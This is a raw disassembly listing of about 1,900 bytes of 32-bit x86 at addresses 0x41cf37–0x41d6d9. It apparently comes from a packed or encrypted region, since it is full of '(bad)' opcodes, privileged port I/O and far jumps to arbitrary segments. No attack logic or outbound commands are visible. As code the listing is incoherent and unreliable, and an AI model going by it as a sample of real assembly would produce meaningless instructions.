  41cf37:	outs   dx,BYTE PTR ds:[esi]
  41cf38:	repz pop ebp
  41cf3a:	cld    
  41cf3b:	rcr    BYTE PTR [ecx],0x89
  41cf3e:	ins    DWORD PTR es:[edi],dx
  41cf3f:	and    al,0x35
  41cf41:	gs std 
  41cf43:	xchg   ecx,eax
  41cf44:	jge    0x41cf53
  41cf46:	mov    edx,0x6ae32550
  41cf4b:	dec    ecx
  41cf4c:	mov    ds:0xc72ed487,eax
  41cf51:	test   al,0xbc
  41cf53:	repnz scas eax,DWORD PTR es:[edi]
  41cf55:	out    0xde,al
  41cf57:	ror    DWORD PTR [edi],0x50
  41cf5a:	scas   eax,DWORD PTR es:[edi]
  41cf5b:	loopne 0x41cee3
  41cf5d:	gs add al,bl
  41cf60:	mov    DWORD PTR [ebp+0x2],ebx
  41cf63:	enter  0x3799,0xfa
  41cf67:	xor    eax,0x2847f53c
  41cf6c:	arpl   WORD PTR [ebx-0x7b],sp
  41cf6f:	call   0xec80:0xdf332227
  41cf76:	mov    al,0xf4
  41cf78:	cmp    al,0xb2
  41cf7a:	xchg   ebp,eax
  41cf7b:	and    BYTE PTR [esi-0x4c],dl
  41cf7e:	imul   ecx,DWORD PTR [eax-0x51],0xffffffba
  41cf82:	mov    eax,0x2bbaba52
  41cf87:	jmp    0xfa2d:0x8f2fa291
  41cf8e:	pmulhuw mm3,QWORD PTR [edx-0x60]
  41cf92:	ds fucom st(5)
  41cf95:	test   DWORD PTR cs:[edi-0x77],ecx
  41cf99:	jmp    0x6bee:0x73efa154
  41cfa0:	cli    
  41cfa1:	mul    BYTE PTR [ecx+0x9c14b4c]
  41cfa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfa8:	mov    BYTE PTR [ebx],dl
  41cfaa:	into   
  41cfab:	push   ds
  41cfac:	fst    DWORD PTR [edx-0x194be8f0]
  41cfb2:	jbe    0x41d008
  41cfb4:	adc    DWORD PTR [eax+0x74],ebx
  41cfb7:	dec    ebp
  41cfb8:	mov    edi,0xcfbd0aa1
  41cfbd:	pop    ds
  41cfbe:	icebp  
  41cfbf:	dec    ebx
  41cfc0:	cmp    al,0x94
  41cfc2:	push   ecx
  41cfc3:	stc    
  41cfc4:	(bad)  
  41cfc5:	clc    
  41cfc6:	xor    eax,0x71374aa4
  41cfcb:	enter  0xb20b,0x8
  41cfcf:	pop    edi
  41cfd0:	mov    ?,ecx
  41cfd2:	inc    ebp
  41cfd3:	shl    DWORD PTR [esi-0x6797b756],1
  41cfd9:	add    edx,DWORD PTR [ebx-0x2732c930]
  41cfdf:	dec    eax
  41cfe0:	mov    BYTE PTR [eax+0x6db523eb],al
  41cfe6:	cmp    ebp,DWORD PTR [eax+0x67]
  41cfe9:	sbb    eax,0xcc2b2d26
  41cfee:	xor    DWORD PTR [edi-0xd0b6f33],ebx
  41cff4:	push   ebx
  41cff6:	mov    ch,0xb4
  41cff8:	sahf   
  41cff9:	mov    fs:0xb85949f6,eax
  41cfff:	imul   al
  41d001:	jns    0x41cfdd
  41d003:	fstp   QWORD PTR [ebx+0x7bc53cc9]
  41d009:	not    ecx
  41d00b:	add    eax,0xf765ea1d
  41d010:	mov    ah,0x66
  41d012:	leave  
  41d013:	jp     0x41d001
  41d015:	out    0xc7,al
  41d017:	push   esp
  41d018:	loop   0x41cfde
  41d01a:	and    edx,esp
  41d01c:	xchg   edi,eax
  41d01d:	inc    esi
  41d01e:	mov    edi,0xb3ec30cc
  41d023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d024:	pop    ecx
  41d025:	out    0x83,eax
  41d027:	data16 outs dx,BYTE PTR ds:[esi]
  41d029:	and    edi,esp
  41d02b:	inc    edi
  41d02c:	cmp    DWORD PTR [ebp+0x62],ebp
  41d02f:	aam    0x70
  41d031:	cmp    DWORD PTR [ebx-0x14d4f168],0xca11b9c6
  41d03b:	jecxz  0x41d0b8
  41d03d:	mov    bh,0xb0
  41d03f:	push   edx
  41d040:	inc    esi
  41d041:	and    eax,0x27b6f431
  41d046:	adc    ecx,esi
  41d048:	pop    ds
  41d049:	(bad)  
  41d04b:	push   esp
  41d04c:	pop    eax
  41d04d:	not    DWORD PTR [ebx]
  41d04f:	adc    al,0x83
  41d051:	or     dl,ah
  41d053:	aaa    
  41d054:	or     al,0xee
  41d056:	adc    bl,al
  41d058:	test   DWORD PTR [ebx+0x53],ebx
  41d05b:	push   ebx
  41d05c:	fild   DWORD PTR [edi-0x21d7f0e0]
  41d062:	pushf  
  41d063:	dec    eax
  41d064:	(bad)  
  41d065:	or     dh,BYTE PTR [esp+edi*2+0x1b]
  41d069:	xor    BYTE PTR [ecx+esi*1],dh
  41d06c:	mov    DWORD PTR [edi],0x40ad7cdd
  41d072:	xor    eax,0xd0a0b663
  41d077:	cmp    esp,DWORD PTR [ecx]
  41d079:	mov    DWORD PTR [eax-0x64],ebx
  41d07c:	loop   0x41d0ec
  41d07e:	cli    
  41d07f:	scas   al,BYTE PTR es:[edi]
  41d080:	lods   eax,DWORD PTR ds:[esi]
  41d081:	and    al,0x48
  41d083:	xchg   esp,eax
  41d084:	cmc    
  41d085:	stos   DWORD PTR es:[edi],eax
  41d086:	pop    ds
  41d087:	pop    edx
  41d088:	sbb    dl,BYTE PTR [ebx-0x4e417fd]
  41d08e:	adc    edi,eax
  41d090:	jbe    0x41d02d
  41d092:	sahf   
  41d093:	xor    al,0x4a
  41d095:	mov    DWORD PTR [edi-0x44323ff2],ecx
  41d09b:	push   ebp
  41d09c:	(bad)  
  41d09d:	push   ebx
  41d09e:	aam    0xb7
  41d0a0:	fs push 0x4329a772
  41d0a6:	cli    
  41d0a7:	retf   
  41d0a8:	idiv   eax
  41d0aa:	xchg   ebp,eax
  41d0ab:	jmp    0x5830:0xe1355c36
  41d0b2:	pop    ebp
  41d0b3:	jp     0x41d0e5
  41d0b5:	push   0x7f
  41d0b7:	bnd jo 0xd0c01923
  41d0be:	jnp    0x41d127
  41d0c0:	aad    0x73
  41d0c2:	pop    esi
  41d0c3:	out    dx,eax
  41d0c4:	addr16 mov bl,0x7f
  41d0c7:	(bad)  
  41d0c9:	imul   edx,DWORD PTR [esi],0x7
  41d0cc:	clc    
  41d0cd:	lea    ecx,[eax-0x59f5c4b1]
  41d0d3:	add    ebp,esp
  41d0d5:	sub    bh,BYTE PTR [ecx+0x72c99f5a]
  41d0db:	dec    ebp
  41d0dc:	sub    eax,0xff471b5a
  41d0e1:	outs   dx,BYTE PTR ds:[esi]
  41d0e2:	dec    ecx
  41d0e3:	xchg   ebx,eax
  41d0e4:	enter  0xc340,0x25
  41d0e8:	fidivr WORD PTR [ebx+0x3f]
  41d0eb:	je     0x41d099
  41d0ed:	jge    0x41d092
  41d0ef:	ss push 0xffffffed
  41d0f2:	out    0x1a,al
  41d0f4:	test   DWORD PTR [edi],eax
  41d0f6:	jp     0x41d105
  41d0f8:	dec    esp
  41d0f9:	mov    bl,0xda
  41d0fb:	rol    DWORD PTR [eax-0x58],1
  41d0fe:	or     al,0x4d
  41d100:	mov    ecx,0x6eb4f4e9
  41d105:	sub    eax,0x4053e3d8
  41d10a:	cmp    DWORD PTR [ecx-0x3096a59f],esi
  41d110:	jno    0x41d104
  41d112:	dec    ebx
  41d113:	jecxz  0x41d0a4
  41d115:	call   0xe35d243b
  41d11a:	mov    ch,BYTE PTR ds:[edx]
  41d11d:	cmp    BYTE PTR [ebp-0x1feacf48],0x41
  41d124:	sub    al,0x81
  41d126:	inc    eax
  41d127:	les    eax,FWORD PTR [edx]
  41d129:	pop    ebx
  41d12a:	in     al,dx
  41d12b:	loop   0x41d129
  41d12d:	and    al,0x3e
  41d12f:	mov    esp,0x800fc24c
  41d134:	not    BYTE PTR [ecx]
  41d136:	bound  esi,QWORD PTR [eax]
  41d138:	call   0xc7287cf2
  41d13d:	jmp    DWORD PTR [ecx-0x6ba4140e]
  41d143:	sub    eax,0xf7b9b977
  41d148:	mov    DWORD PTR [ebx],eax
  41d14a:	ss ds mov esp,0x596e61ed
  41d151:	add    DWORD PTR [ecx+0x3],edi
  41d154:	daa    
  41d155:	enter  0xf4ca,0xdd
  41d159:	mov    eax,ds:0xc8940948
  41d15e:	aam    0x27
  41d160:	(bad)  
  41d161:	dec    ebx
  41d162:	sbb    eax,0x1a9c850a
  41d168:	mov    ?,WORD PTR [edi]
  41d16a:	ins    BYTE PTR es:[edi],dx
  41d16b:	or     dh,BYTE PTR [edi]
  41d16d:	jl     0x41d14c
  41d16f:	mov    bh,0x86
  41d171:	retf   0x7925
  41d174:	cmp    eax,0xb2c91fc8
  41d179:	test   ch,bl
  41d17b:	(bad)  
  41d17c:	and    eax,ebp
  41d17e:	je     0x41d115
  41d180:	push   ds
  41d181:	add    eax,0xdeb2ac29
  41d186:	add    edi,DWORD PTR [edi-0x34]
  41d189:	xchg   esi,eax
  41d18a:	and    DWORD PTR [ebx],edi
  41d18c:	xlat   BYTE PTR ds:[ebx]
  41d18d:	or     al,bl
  41d18f:	xchg   ebp,eax
  41d190:	mov    BYTE PTR [esi-0x495f6568],ch
  41d196:	pop    ecx
  41d197:	ds icebp 
  41d199:	sub    BYTE PTR [esi+0x72],bl
  41d19c:	adc    BYTE PTR [ecx+0x2f],ch
  41d19f:	mov    ah,0x2
  41d1a1:	push   esp
  41d1a2:	xchg   DWORD PTR [eax-0x252a8558],esi
  41d1a8:	inc    ebx
  41d1a9:	imul   eax,DWORD PTR [ebx],0x18421673
  41d1af:	inc    edx
  41d1b0:	stc    
  41d1b1:	jmp    0xf2385373
  41d1b6:	jl     0x41d1fe
  41d1b8:	int    0xb8
  41d1ba:	xchg   DWORD PTR ds:0xd2ce8b38,ebp
  41d1c0:	jg     0x41d237
  41d1c2:	jg     0x41d207
  41d1c4:	mov    bl,0x12
  41d1c6:	jbe    0x41d1ed
  41d1c8:	and    ebp,ecx
  41d1ca:	(bad)  
  41d1cb:	shl    BYTE PTR [edx],1
  41d1cd:	(bad)  
  41d1ce:	repnz inc esi
  41d1d0:	pop    esi
  41d1d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1d2:	add    bl,bl
  41d1d4:	imul   ebp,edi,0xffffffa3
  41d1d7:	dec    ebp
  41d1d8:	xchg   ecx,eax
  41d1d9:	jmp    0xfb8:0xffc43e20
  41d1e0:	sub    ah,0x25
  41d1e3:	pop    ds
  41d1e4:	jbe    0x41d19a
  41d1e6:	push   edx
  41d1e7:	mov    fs,WORD PTR [ebx-0x4880ed9a]
  41d1ed:	xchg   edi,eax
  41d1ee:	in     al,0x51
  41d1f0:	mov    ebp,0x27efbafa
  41d1f5:	push   ebx
  41d1f6:	popa   
  41d1f7:	loopne 0x41d22c
  41d1f9:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41d1fb:	or     DWORD PTR [ecx-0x54],ebp
  41d1fe:	inc    edx
  41d1ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d200:	inc    edx
  41d201:	mov    ch,0x1f
  41d203:	jl     0x41d1fc
  41d205:	(bad)  
  41d207:	mov    esi,0xace871e1
  41d20c:	retf   0x2f54
  41d20f:	lock je 0x41d1fc
  41d212:	jg     0x41d27e
  41d214:	add    BYTE PTR [ebp-0x4a553904],ch
  41d21a:	fild   WORD PTR [ebx+0x6afc8f49]
  41d220:	dec    esi
  41d221:	dec    edx
  41d222:	mov    esi,0xa931a2a2
  41d227:	mov    ?,WORD PTR [ebp-0x67]
  41d22a:	(bad)  
  41d22b:	sti    
  41d22c:	cmp    DWORD PTR [esi+0x2585479a],0xa
  41d233:	inc    ecx
  41d234:	jbe    0x41d20d
  41d236:	dec    DWORD PTR [edi-0x5232491d]
  41d23c:	inc    edx
  41d23d:	or     DWORD PTR [edi-0x19bb9351],eax
  41d243:	add    eax,0xe7ef06b4
  41d248:	push   ebp
  41d249:	or     bl,BYTE PTR [esp+eiz*4-0x7c]
  41d24d:	shl    BYTE PTR [edx+0x55],0x1
  41d251:	adc    ebp,DWORD PTR [esi]
  41d253:	push   cs
  41d254:	fld    TBYTE PTR [eax-0x2667e438]
  41d25a:	mov    ebx,0x3534ac87
  41d25f:	in     eax,0xf2
  41d261:	sub    DWORD PTR [eax+0x23148d9a],0xffffffa0
  41d268:	push   ecx
  41d269:	xlat   BYTE PTR ds:[ebx]
  41d26a:	lods   al,BYTE PTR ds:[esi]
  41d26b:	push   ecx
  41d26c:	jp     0x41d2a2
  41d26e:	int3   
  41d26f:	ins    DWORD PTR es:[edi],dx
  41d270:	push   ss
  41d271:	aam    0x6
  41d273:	stos   BYTE PTR es:[edi],al
  41d274:	sbb    ebx,DWORD PTR [eax-0x61]
  41d277:	adc    bl,BYTE PTR [edx]
  41d279:	popa   
  41d27a:	lods   al,BYTE PTR ds:[esi]
  41d27b:	mov    dh,BYTE PTR [esi-0x77]
  41d27e:	inc    ebp
  41d27f:	dec    ebx
  41d280:	les    ecx,FWORD PTR [ebx-0x19f58918]
  41d286:	mov    bh,0xab
  41d288:	ret    0xdf68
  41d28b:	dec    ebp
  41d28c:	sub    esp,DWORD PTR [edi]
  41d28e:	sbb    DWORD PTR [ebx],0xe7cc9ce3
  41d294:	popf   
  41d295:	fstp   DWORD PTR [edx-0x38]
  41d298:	fidiv  DWORD PTR [edx]
  41d29a:	adc    esi,DWORD PTR [ebx-0x3ae3a525]
  41d2a0:	fsub   QWORD PTR [ebx+0x1b3b984b]
  41d2a6:	aam    0x4c
  41d2a8:	add    ch,BYTE PTR [ebx+0x29b2f0d4]
  41d2ae:	shl    BYTE PTR [eax-0x5ba3e9fd],cl
  41d2b4:	mov    BYTE PTR [ecx-0x63],bl
  41d2b7:	jle    0x41d30e
  41d2b9:	ds test eax,0x6bc7a9bb
  41d2bf:	sub    al,0x2b
  41d2c1:	xor    dh,cl
  41d2c3:	dec    edi
  41d2c4:	outs   dx,BYTE PTR ds:[esi]
  41d2c5:	adc    edx,DWORD PTR [ebx+edi*1-0xb7a1f16]
  41d2cc:	xchg   edi,eax
  41d2cd:	fist   WORD PTR [ecx+0x27]
  41d2d0:	aad    0xbc
  41d2d2:	or     BYTE PTR [eax],0x18
  41d2d5:	push   ebp
  41d2d6:	or     al,al
  41d2d8:	adc    ebx,DWORD PTR [ecx+0x70cb5303]
  41d2de:	mov    ebp,0x83c33b7c
  41d2e3:	mov    ebx,0x73b85b86
  41d2e8:	jle    0x41d297
  41d2ea:	fild   QWORD PTR [ebx+0x78]
  41d2ed:	adc    DWORD PTR ds:0x3097dc98,0xf9703305
  41d2f7:	loope  0x41d324
  41d2f9:	test   ah,dh
  41d2fb:	sub    dl,dl
  41d2fd:	bound  eax,QWORD PTR [eax-0x29f78371]
  41d303:	fidivr WORD PTR [edx-0x44114b42]
  41d309:	fidiv  WORD PTR [ecx-0x59011916]
  41d30f:	mov    al,ds:0x963881b1
  41d314:	add    DWORD PTR [edi+0x1],eax
  41d317:	push   ecx
  41d318:	fidivr WORD PTR [esi+0x3b]
  41d31b:	(bad)  
  41d31c:	cmp    edi,eax
  41d31e:	dec    esp
  41d31f:	fs sbb al,0xd0
  41d322:	dec    edi
  41d323:	mov    ds:0xe3428d74,al
  41d328:	data16 icebp 
  41d32a:	fisubr DWORD PTR [edi+0x4195891]
  41d330:	pop    ebp
  41d331:	loop   0x41d384
  41d333:	adc    al,0x26
  41d335:	(bad)
  41d339:	repnz cmp bl,dl
  41d33c:	inc    esi
  41d33d:	jne    0x41d37d
  41d33f:	aam    0xae
  41d341:	mov    bl,0xf2
  41d343:	mov    ebp,0xfa7c55a4
  41d348:	(bad)  
  41d34a:	and    ebp,edx
  41d34c:	in     eax,0xe4
  41d34e:	sar    BYTE PTR [ecx],0xae
  41d351:	push   edi
  41d352:	nop
  41d353:	test   DWORD PTR [ecx-0x6],ebp
  41d356:	and    DWORD PTR [edi-0x24],ecx
  41d359:	push   cs
  41d35a:	enter  0xc295,0x8f
  41d35e:	mov    ds:0x7b557122,al
  41d363:	out    0xc1,eax
  41d365:	inc    esi
  41d366:	shl    BYTE PTR [edx-0x33],1
  41d369:	frstor [esi*1+0x3f9d3f48]
  41d370:	int3   
  41d371:	pop    esi
  41d372:	stos   DWORD PTR es:[edi],eax
  41d373:	cmp    BYTE PTR [ebp+0x7df392c],al
  41d379:	int3   
  41d37a:	test   BYTE PTR [bp-0x3051],ch
  41d37f:	(bad)  
  41d380:	aam    0xe0
  41d382:	cli    
  41d383:	add    DWORD PTR [esi+0x54],eax
  41d386:	mov    edx,0xcea9b159
  41d38b:	cmp    BYTE PTR [ecx],cl
  41d38d:	pop    eax
  41d38e:	adc    edx,ebp
  41d390:	jnp    0x41d3fb
  41d392:	cld    
  41d393:	lds    esp,FWORD PTR [edi]
  41d395:	adc    eax,0xfe9a46a8
  41d39a:	push   eax
  41d39b:	push   edi
  41d39c:	jecxz  0x41d3e7
  41d39e:	dec    eax
  41d39f:	je     0x41d326
  41d3a1:	dec    ebp
  41d3a2:	mov    esp,0xb96598fb
  41d3a7:	leave  
  41d3a8:	xor    ch,BYTE PTR ds:0x1c77656d
  41d3ae:	mov    al,0xc4
  41d3b0:	jmp    0x41d39a
  41d3b2:	add    BYTE PTR [eax],al
  41d3b4:	jo     0x41d3d0
  41d3b6:	jb     0x41d40b
  41d3b8:	mov    bl,0xc1
  41d3ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3bb:	pop    edi
  41d3bc:	push   es
  41d3bd:	add    ah,BYTE PTR [esi]
  41d3bf:	mov    BYTE PTR [edi+0x50],bl
  41d3c2:	jle    0x41d3d0
  41d3c4:	es xchg edx,eax
  41d3c6:	and    ch,dl
  41d3c8:	mov    esp,0xff724317
  41d3cd:	and    cl,bh
  41d3cf:	sahf   
  41d3d0:	test   eax,0x39e988ca
  41d3d5:	xor    BYTE PTR [ecx-0x5b],0x13
  41d3d9:	std    
  41d3da:	stc    
  41d3db:	push   edi
  41d3dc:	int    0xda
  41d3de:	(bad)  
  41d3df:	push   ecx
  41d3e0:	mov    ds:0xf0ee4fd4,eax
  41d3e5:	and    ebx,edi
  41d3e7:	adc    BYTE PTR [edi-0x28c537cd],0xae
  41d3ee:	aam    0x2b
  41d3f0:	cmp    BYTE PTR [ebp-0x6a436987],dl
  41d3f6:	jg     0x41d40f
  41d3f8:	dec    esp
  41d3f9:	clc    
  41d3fa:	fwait
  41d3fb:	test   DWORD PTR [edx],esp
  41d3fd:	rcr    esi,0x3f
  41d400:	adc    eax,0x76002bba
  41d405:	leave  
  41d406:	sti    
  41d407:	outs   dx,BYTE PTR ds:[esi]
  41d408:	(bad)  
  41d409:	jmp    0x8049ff58
  41d40e:	pop    ds
  41d40f:	imul   DWORD PTR [edx-0x9b659c0]
  41d415:	test   DWORD PTR [eax],esp
  41d417:	test   ebx,0xb8aa9af4
  41d41d:	fisubr DWORD PTR [ebx+0x760ae34a]
  41d423:	inc    ebx
  41d424:	sbb    al,0xd
  41d426:	pop    ebp
  41d427:	mul    ch
  41d429:	les    ebp,FWORD PTR [ebx]
  41d42b:	adc    al,0x4b
  41d42d:	leave  
  41d42e:	dec    edx
  41d42f:	jmp    0xc1fb003e
  41d434:	in     al,0xe3
  41d436:	jns    0x41d49c
  41d438:	shl    DWORD PTR [edx],cl
  41d43a:	sar    DWORD PTR es:[edx+ecx*8],1
  41d43e:	adc    DWORD PTR [edi],ebp
  41d440:	(bad)  
  41d441:	out    dx,al
  41d442:	js     0x41d470
  41d444:	aas    
  41d445:	cli    
  41d446:	pop    ecx
  41d447:	and    ebx,DWORD PTR [ebp+0x5325e58]
  41d44d:	or     DWORD PTR [ebx-0x4c1bab90],0xffffff9a
  41d454:	mov    edi,0xc9a313d
  41d459:	inc    edi
  41d45a:	es clc 
  41d45c:	or     eax,DWORD PTR [ebx]
  41d45e:	int3   
  41d45f:	hlt    
  41d460:	push   es
  41d461:	es mov ebp,0xa2e6233b
  41d467:	xchg   DWORD PTR [eax-0x6b8321ec],edi
  41d46d:	sbb    DWORD PTR [edi-0x7a632bee],eax
  41d473:	retf   0xdad
  41d476:	in     al,0x41
  41d478:	popa   
  41d479:	xchg   BYTE PTR [eax-0x5603baa8],cl
  41d47f:	cmp    eax,0x781e8fbf
  41d484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d485:	jbe    0x41d47e
  41d487:	jp     0x41d41f
  41d489:	dec    ecx
  41d48a:	lock imul BYTE PTR [ecx]
  41d48d:	js     0x41d486
  41d48f:	inc    eax
  41d490:	(bad)  
  41d491:	mov    ebx,0x992eef33
  41d496:	xchg   ebp,eax
  41d497:	std    
  41d498:	pusha  
  41d499:	lahf   
  41d49a:	ins    BYTE PTR es:[edi],dx
  41d49b:	lods   al,BYTE PTR ds:[esi]
  41d49c:	push   es
  41d49d:	mov    es,WORD PTR [edi-0x65b4c5ea]
  41d4a3:	popa   
  41d4a4:	jmp    0x7a973e6f
  41d4a9:	sbb    BYTE PTR [di],dh
  41d4ac:	ins    BYTE PTR es:[edi],dx
  41d4ad:	fnstenv [ebp+edx*2-0x637b4df0]
  41d4b4:	adc    eax,0xffffffc0
  41d4b7:	and    eax,0x8a87e31f
  41d4bc:	push   ss
  41d4bd:	js     0x41d4d8
  41d4bf:	xor    DWORD PTR gs:[edi-0x1d0b4be8],0x5913890b
  41d4ca:	adc    al,0xc7
  41d4cc:	mov    edi,0xb02afb98
  41d4d1:	cdq    
  41d4d2:	dec    ebx
  41d4d3:	jmp    0x6459faec
  41d4d8:	cmp    ebp,esi
  41d4da:	and    esp,DWORD PTR [ebp+edx*4+0x32]
  41d4de:	in     al,dx
  41d4df:	jge    0x41d464
  41d4e1:	mov    ebx,0x468216fc
  41d4e6:	jp     0x41d46c
  41d4e8:	jae    0x41d520
  41d4ea:	retf   0x1b72
  41d4ed:	mov    dl,0x9b
  41d4ef:	xor    BYTE PTR [esi+0x1d],ah
  41d4f2:	pcmpeqw mm4,QWORD PTR [ebx+0x22]
  41d4f6:	push   ecx
  41d4f7:	jno    0x41d531
  41d4f9:	sub    al,0xe2
  41d4fb:	dec    edx
  41d4fc:	mov    ah,0x5d
  41d4fe:	pop    ebp
  41d4ff:	call   0x3e0c:0x267efaaa
  41d506:	sbb    BYTE PTR [ecx],bl
  41d508:	inc    ebp
  41d509:	mov    ds:0x4cc5fccf,eax
  41d50e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d50f:	xor    al,BYTE PTR [eax]
  41d511:	jb     0x41d4ef
  41d513:	ret    
  41d514:	jle    0x41d4c7
  41d516:	ret    0xec33
  41d519:	pop    esi
  41d51a:	fld    QWORD PTR [ecx+0x19b9a029]
  41d520:	or     ch,0x33
  41d523:	add    BYTE PTR [ebp-0x1b4e97c7],bl
  41d529:	mov    edx,0xe2f29dc7
  41d52e:	or     DWORD PTR [esi],edx
  41d530:	mov    al,ds:0x2b6d9b18
  41d535:	xchg   ebp,eax
  41d536:	mov    dh,0x89
  41d538:	mov    ebp,0x6f6e66da
  41d53d:	stos   BYTE PTR es:[edi],al
  41d53e:	cld    
  41d53f:	and    ah,BYTE PTR [edi]
  41d541:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d542:	lods   eax,DWORD PTR ds:[esi]
  41d543:	cmp    bl,ch
  41d545:	push   0x7a
  41d547:	cwde   
  41d548:	clc    
  41d549:	dec    ecx
  41d54a:	outs   dx,BYTE PTR ds:[esi]
  41d54b:	push   esp
  41d54c:	sbb    al,0x2
  41d54e:	lock pop esi
  41d550:	ds in  al,0x29
  41d553:	daa    
  41d554:	and    eax,DWORD PTR [edi]
  41d556:	xlat   BYTE PTR ds:[ebx]
  41d557:	push   ds
  41d558:	or     BYTE PTR [esi-0x6d03b98d],al
  41d55e:	pop    ss
  41d55f:	(bad)  
  41d560:	push   0xefd32015
  41d565:	dec    ebp
  41d566:	sub    DWORD PTR [ecx],ebx
  41d568:	in     al,0x74
  41d56a:	cwde   
  41d56b:	push   es
  41d56c:	mov    ds,WORD PTR [edx+ebp*4]
  41d56f:	lahf   
  41d570:	aaa    
  41d571:	pop    edi
  41d572:	sbb    al,0xac
  41d574:	cli    
  41d575:	pop    ebp
  41d576:	inc    edx
  41d577:	ss (bad) 
  41d579:	jmp    0x712908c7
  41d57e:	sub    ebx,esi
  41d580:	jecxz  0x41d5fb
  41d582:	(bad)  [edi-0x158858e6]
  41d588:	xlat   BYTE PTR ds:[ebx]
  41d589:	push   ss
  41d58a:	jecxz  0x41d565
  41d58c:	test   eax,0xc9d0f0d1
  41d592:	push   edx
  41d593:	pop    ss
  41d594:	dec    edi
  41d595:	daa    
  41d596:	push   ecx
  41d597:	and    cl,BYTE PTR [esi]
  41d599:	lahf   
  41d59a:	adc    al,0xd3
  41d59c:	mov    bl,0x9
  41d59e:	xor    al,0x42
  41d5a0:	(bad)  
  41d5a1:	push   ds
  41d5a2:	pop    es
  41d5a3:	clc    
  41d5a4:	push   ebp
  41d5a5:	jecxz  0x41d542
  41d5a7:	jne    0x41d577
  41d5a9:	mov    al,0x1b
  41d5ab:	mov    al,0x70
  41d5ad:	jae    0x41d58f
  41d5af:	adc    dh,BYTE PTR [ecx-0x3a]
  41d5b2:	bound  eax,QWORD PTR [edi-0x7377bc5]
  41d5b8:	inc    ebx
  41d5b9:	outs   dx,DWORD PTR ds:[esi]
  41d5ba:	mov    ds:0xc4f37c53,al
  41d5bf:	mov    ds:0x8e015f4,al
  41d5c4:	sbb    DWORD PTR [esi+0x34],edi
  41d5c7:	adc    al,0xf8
  41d5c9:	stc    
  41d5ca:	add    ebp,DWORD PTR [ebp+0x2c]
  41d5cd:	fmul   DWORD PTR [ecx+ecx*2-0x7729a99e]
  41d5d4:	mov    cl,0xa3
  41d5d6:	fs push ecx
  41d5d8:	push   es
  41d5d9:	fstp   TBYTE PTR [ebp+0x57e1a72f]
  41d5df:	loopne 0x41d5f1
  41d5e1:	enter  0xdd83,0x6c
  41d5e5:	jecxz  0x41d660
  41d5e7:	pop    edi
  41d5e8:	add    eax,0x9a1b9b95
  41d5ed:	sub    eax,0x3687b2a0
  41d5f2:	inc    edi
  41d5f3:	call   DWORD PTR [ebx]
  41d5f5:	(bad)  
  41d5f7:	cmp    eax,0x9e19634d
  41d5fc:	gs jl  0x41d58e
  41d5ff:	add    al,0xc7
  41d601:	in     eax,dx
  41d602:	add    BYTE PTR [edx],ch
  41d604:	pop    ebx
  41d605:	sub    eax,0x3daa1e68
  41d60a:	lods   al,BYTE PTR ds:[esi]
  41d60b:	sbb    esi,DWORD PTR [edx]
  41d60d:	loope  0x41d681
  41d60f:	adc    ebx,eax
  41d611:	jmp    0xbd5a5e93
  41d616:	sbb    eax,esi
  41d618:	loope  0x41d65b
  41d61a:	rcr    ah,0x57
  41d61d:	in     eax,dx
  41d61e:	sahf   
  41d61f:	mov    WORD PTR [edi],fs
  41d621:	popf   
  41d622:	ror    DWORD PTR [edx-0x78],cl
  41d625:	jnp    0x41d63a
  41d627:	jp     0x41d612
  41d629:	add    BYTE PTR [ebp+0x55206000],dl
  41d62f:	mov    cl,0x63
  41d631:	dec    ecx
  41d632:	push   es
  41d633:	mov    ds:0xcaca485e,al
  41d638:	mov    gs,WORD PTR [eax+0x14]
  41d63b:	adc    BYTE PTR [ecx+0x3e312508],ch
  41d641:	sbb    eax,0x514168b6
  41d646:	sub    al,0xef
  41d648:	gs retf 
  41d64a:	dec    eax
  41d64b:	loop   0x41d63b
  41d64d:	popa   
  41d64e:	inc    eax
  41d64f:	mov    BYTE PTR [edx+esi*1-0x2fc865b9],cl
  41d656:	je     0x41d67c
  41d658:	jp     0x41d698
  41d65a:	dec    eax
  41d65b:	push   ebx
  41d65c:	ret    
  41d65d:	out    dx,al
  41d65e:	dec    sp
  41d660:	dec    ebp
  41d661:	ds mov al,0x6a
  41d664:	jle    0x41d613
  41d666:	push   es
  41d667:	jge    0x41d639
  41d669:	jmp    FWORD PTR [ecx+0x4d6c8d62]
  41d66f:	and    DWORD PTR [ebx],0xfffffffe
  41d672:	mov    bl,al
  41d674:	push   ecx
  41d675:	call   0xf119:0x96f26550
  41d67c:	mov    cl,0x99
  41d67e:	inc    edi
  41d67f:	pop    ebx
  41d680:	add    al,0x22
  41d682:	lahf   
  41d683:	leave  
  41d684:	adc    al,0x3a
  41d686:	xlat   BYTE PTR ds:[ebx]
  41d687:	lock aas 
  41d689:	push   eax
  41d68a:	sub    al,0xd7
  41d68c:	jle    0x41d6e3
  41d68e:	mov    al,0x86
  41d690:	stos   DWORD PTR es:[edi],eax
  41d691:	mov    al,0x21
  41d693:	mov    al,ds:0x3c4c222b
  41d699:	aas    
  41d69a:	inc    ecx
  41d69b:	or     eax,0x46f4935f
  41d6a0:	jne    0x41d700
  41d6a2:	sbb    BYTE PTR [ecx+0x31],0x5f
  41d6a6:	xchg   esp,eax
  41d6a7:	sub    ebp,edx
  41d6a9:	adc    eax,0xf7037a23
  41d6ae:	inc    ebx
  41d6af:	xor    dl,0x2d
  41d6b2:	loope  0x41d6e7
  41d6b4:	and    ch,bh
  41d6b6:	fs inc esp
  41d6b8:	scas   al,BYTE PTR es:[edi]
  41d6b9:	push   0x77b52d71
  41d6be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6bf:	call   0xff66fc91
  41d6c4:	xor    eax,0xf7a8f071
  41d6c9:	dec    edx
  41d6ca:	sbb    al,0x3e
  41d6cc:	xor    esi,DWORD PTR [ebx]
  41d6ce:	(bad)  
  41d6cf:	shr    esi,cl
  41d6d1:	inc    ecx
  41d6d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6d3:	sbb    edi,DWORD PTR [esi+eax*8+0x54]
  41d6d7:	and    al,0x9d
  41d6d9:	clc    
